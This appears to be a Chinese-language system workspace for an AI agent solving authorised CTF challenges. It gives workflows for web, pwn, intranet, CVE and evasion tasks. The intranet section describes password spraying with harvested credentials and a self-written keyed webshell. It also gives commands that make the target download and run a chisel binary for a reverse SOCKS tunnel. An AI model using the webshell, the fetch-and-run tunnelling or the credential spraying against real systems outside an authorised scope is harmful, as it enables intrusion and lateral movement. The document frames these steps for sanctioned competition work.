# 全量 CTF 工作区
**目标：拿到 flag 并 `heimdall-submit`。**

授权、平台命令、停止条件、注入块读法与字典政策见系统提示。

按题目类型选择下面的分区，只按那一区的工具与流程做；不要混用其它分区。

| 类型 | 分区 |
|------|------|
| Web / 登录框 / 前端 | Web |
| 二进制 / ELF / APK / 溢出 | Pwn |
| 多主机 横向 / 内网多flag | 内网 |
| 已知产品 / CVE | 通用漏洞 |
| 免杀 / 壳 / AMSI | 对抗规避 |
---

# Web 应用工作区
## 工具

| 面 | 工具 |
|---|---|
| 平台 | `heimdall-challenge` `heimdall-submit` `heimdall-ocr` `heimdall-cve` |
| HTTP | `playwright-cli`（会话 `.heimdall/browser/state.json`）`curl` `httpx` `jq` |
| 扫/注 | `sqlmap`；`dirsearch` + `paths.txt`（换语言 `-e php`）
| 图 | `heimdall-ocr` `tesseract` `convert`（默认 `eng+chi_sim`） |
| Java | `jdumpspider` `rogue-jndi` `ldaps-wrap`；`java8` / `java11` |

内置精选字典位于 `/opt/heimdall/tools/wordlists/`（详见 `README.md`），按漏洞类型选用：路径/泄露 `paths.txt`，弱口令 `usernames.txt` + `passwords.txt`，文件读取/穿越 `lfi.txt`，SQL 注入 `sqli.txt`。

## 执行

读简报 → 顺着题目线索链接、表单、JS、报错、暴露文件 → `playwright-cli` 登录 / 长会话 / XSS → 拿到 `flag{...}` 就交。

按症状锁一类再证，写进 `progress.md`。像已知产品 → bash `grep -Ril <产品> /root/nuclei-templates/http/cves` → `heimdall-cve CVE-…`。


范围 = `input.json` 给定地址，不要扫描网络，web只有给定的端口，静态/API 用 `curl`/`httpx`；登录与 XSS 用 `playwright-cli`。临时文件放 `tmp/`。无出网：听本机 IP，不要 Collaborator。

## Playwright

镜像已带 Chromium。开一次会话，登录后 `state-save` / `state-load`。

```bash
playwright-cli open http://TARGET/
playwright-cli snapshot
playwright-cli click e3
playwright-cli fill e5 'user'
playwright-cli eval '() => document.cookie'
playwright-cli state-save .heimdall/browser/state.json
playwright-cli cookie-list
```

XSS：这个浏览器就是受害者；用 `eval` / `console` / `cookie-list` 取赃。

## OCR（验证码 / canvas / 图中 flag）

DOM 读不到的字打到 stdout：

```bash
heimdall-ocr tmp/c.png
# 短验证码
convert tmp/c.png -colorspace Gray -resize 300% -threshold 50% tmp/c2.png
tesseract tmp/c2.png stdout -l eng --psm 7
```
提交前去掉 OCR 插入的空白。短码用 `--psm 7`（`--psm 8`+白名单易把 `A7K2` 认成 `ATK2`）。
---

# Pwn / 二进制工作区

工具已在镜像里，直接调用

## 工具

| 阶段 | 工具 |
|---|---|
| 识别 | `file` `readelf` `strings` `xxd` `objdump` `nm` `ldd` `checksec` `patchelf` |
| 静态 | `r2` / `radare2` |
| 反编译 | `pyghidra-mcp`（`$GHIDRA_INSTALL_DIR=/opt/heimdall/ghidra`） |
| 动态 | `gdb`+pwndbg `gdb-multiarch` `gdbserver` `strace` `ltrace` `qemu-*` |
| ROP / libc | `ROPgadget` `one_gadget` `seccomp-tools` `pwninit` |
| 写 exp | `pwntools` `angr` `unicorn` `capstone` `keystone` `elftools` `z3` |
| 编译 | `gcc` `g++` `make` `cmake` `nasm` |
| APK | `jadx` `apktool` `androguard` |
---

# 内网渗透工作区（多flag解题）


| 面 | 工具 |
|---|---|
| 路径扫描 | `dirsearch` + `paths.txt`，初始探测时使用轻量扫描信息收集|
| webshell | 自写 HTTP 助手，用 `curl` 交互 |
| 代理 | **优先** reverse chisel（`127.0.0.1:1080`）；回连不通再在靶上起 chisel server |
| SSH/SQL | `sshpass` `mysql` `psql` `sqlite3` |
| AD | `nxc` `certipy` Impacket（`/opt/heimdall/ad`）；同一目标串行 |
| 其它 | `nmap` `curl` `nuclei` `john` `heimdall-ocr`；`chisel` |

## 字典

内置精选字典位于 `/opt/heimdall/tools/wordlists/`（详见 `README.md`），按漏洞类型选用：路径/泄露 `paths.txt`，弱口令 `usernames.txt` + `passwords.txt`，文件读取/穿越 `lfi.txt`，SQL 注入 `sqli.txt`。

观察者读日志，并引导从已控面（web 后台 / 库 / 面板 / 配置 / history）dump **登录名和口令规则**，写入 `.heimdall/traffic/loot.json`。已收集的登录名和规则自由扩成：

- `.heimdall/traffic/spray_users.txt`
- `.heimdall/traffic/spray_passwords.txt`
- `.heimdall/traffic/spray_creds.txt`（`user:pass`）

登录口先喷轻量通用字典 `/opt/heimdall/tools/wordlists/passwords.txt`（对表单用户名 / `admin`）。没中再用观察者动态产出的字典 `.heimdall/traffic/spray_creds.txt` 针对性；本里已有、该面还没试的族就喷，不要 rockyou。读到空表只说明观察者这一拍还没 publish，不要否定字典；CONFIRMED / 图上出现 `DICT` 或 `rev` 变了就再读。HTTP / SSH / FTP 登录喷并发 4；deny 后 0.3–0.5s；超时或 No route 停 10s,可以根据情报构造针对喷洒，但是不能自己瞎猜构造超大字典打蹦服务。

## 序

**RCE 了先自写稳定 webshell，用它执行命令和上传，再用 chisel 打隧道，再后渗透。**

外网 `container_addr` → 轻量路径扫 → 第一面 flag 立刻交 → RCE / 库 / 面板先只读收情报（用户名、哈希、配置、history、密钥、产品名、人名 → loot / `spray_*.txt`）→ 自写壳（命令执行和上传都走 curl）→ **优先 reverse chisel**（探测到回连地址）→ 不通再 **靶上 chisel server + 本机 client** → `proxychains4`。AD 域用工具包横向。

## 端口

| | |
|---|---|
| chisel SOCKS | `1080`（本机 `127.0.0.1:1080`） |
| chisel 投放 | `$CHISEL_DROP`（`/opt/heimdall/proxy/chisel-drop/`） |

## 自写 webshell

按目标语言自己写一个小 HTTP 助手，落到可 web 访问的路径，命令执行和文件上传**默认走这个助手**。用 `curl --data-urlencode`，先 `whoami` 再干别的。不要覆盖正在用的壳。

自己实现（无密钥返回 404）：
- `op=run`：执行 `c`，回 stdout+stderr 原文
- `op=put`：把 `b64` 解码写到 `path`
- `op=get`：读 `path`，回原文
- 长任务：`run` 里 `nohup ... >/tmp/job.log 2>&1 & echo $!`，再 `run`/`get` 轮询到结束

```bash
# 源码先写到 artifacts/，再用当前 RCE 落到靶上，记下 SHELL_URL / SHELL_KEY
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=whoami"
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=put" --data-urlencode "path=/tmp/x" --data-urlencode "b64=$(base64 -w0 ./local_x)"
```

## 代理
不出网，但目标和本机局域网相通，可在本机建立服务端

```bash
# 优先 reverse chisel（靶上 200 才填 REACHABLE_IP）
python3 -m http.server 8000 --bind 0.0.0.0 --directory "$CHISEL_DROP"
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=curl -fsSL http://$REACHABLE_IP:8000/chisel_linux_amd64 -o /tmp/chisel && chmod +x /tmp/chisel"
"$CHISEL_DROP/chisel_linux_amd64" server --reverse --socks5 --host 0.0.0.0 --port 8080
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=nohup /tmp/chisel client http://$REACHABLE_IP:8080 R:socks >/tmp/chisel.log 2>&1 & echo $!"
# 备用（回连全 timeout）：助手在靶上起 chisel server --socks5 --host 0.0.0.0 --port 1080，本机 chisel client http://TARGET:1080 socks；端口不通就继续用助手在靶上执行内网命令
```

## 硬规则

- 范围 = `container_addr` / 题目网段。
- 先只读枚举；改域 / dump 凭据前确认是拿 flag 所需。
- 有 `flag{...}` 立刻 submit。换实例后旧 IP 作废（`dead_hosts`）。

---

# 通用漏洞

## 顺序

1. `curl -si` 每个给定地址；只信标题、头、cookie、路径。
2. 用 **bash** `grep -Ril` 搜库（Grep 工具只扫工作区）。标题/头里的英文字样都试。CVE 号用 `heimdall-cve CVE-…` 打开。
3. yaml 当请求样例，**curl 复现**；nuclei 辅助只打**点名那一条**。需要时写 `artifacts/exp.py`。
4. 范围 = `container_addr`。拿到 flag 就交。

```
curl -si → bash grep 产品 → heimdall-cve CVE-… → curl 复现 → submit
```

## 查 PoC

```bash
grep -Ril sharepoint /root/nuclei-templates/http/cves /opt/heimdall/cve-poc/nuclei
heimdall-cve CVE-2025-53770
nuclei -duc -u http://TARGET -t <路径>
```

库：`/root/nuclei-templates/http/cves`（官方全树）+ extras `/opt/heimdall/cve-poc/nuclei`

## 工具

| 面 | 工具 |
|---|---|
| 指纹 | `curl -si` `httpx` `whatweb`；多端口 `nmap -sV` |
| 查库 | bash `grep -Ril`；`heimdall-cve CVE-…` |
| 复现 | `curl` / `python3`；单条 `nuclei -duc -t` |
| 登录 UI | `playwright-cli` |
| Java | `rogue-jndi` `ldaps-wrap` `jdumpspider`（`java8`） |

---

# 对抗规避工作区

**目标：认出规避了哪一层，拆开它，拿到 flag 并 `heimdall-submit`。**

交付物是识别与拆样本，不是完整免杀加载器。

## 工具

| 阶段 | 工具 |
|---|---|
| 识别 | `file` `readelf` `strings` `xxd` `objdump` `nm` `ldd` `checksec` `exiftool` `binwalk` |
| 静态 | `r2`；节区/熵 `readelf -S` / `objdump -h` |
| 反编译 | `pyghidra-mcp`（`$GHIDRA_INSTALL_DIR=/opt/heimdall/ghidra`） |
| 动态 | `gdb`+pwndbg `strace` `ltrace` `qemu-*` |
| 加壳 | `binwalk` `7z` `unzip` |
| 脚本 | `python3` `pycryptodome` `cryptography` |
| HTTP 门 | `curl` `httpx`；登录 UI `playwright-cli` |
| APK | `jadx` `apktool` `androguard` |

## 顺序

```
file + strings + 节区/熵
  → 取 flag{...} → heimdall-submit
```

1. 下载附件 → `file`
2. 症状表锁一类，写进 `progress.md`；一次拆一层
3. 加壳：找 stub 解密循环与密钥，Python 还原
4. 反调试门：定位检查后补掉或满足它
5. 上传扫描器：一次改一种载体，控制变量对照过/不过

## 硬规则

- 范围 = 给定地址与附件。
- 拿到 flag 就交。。
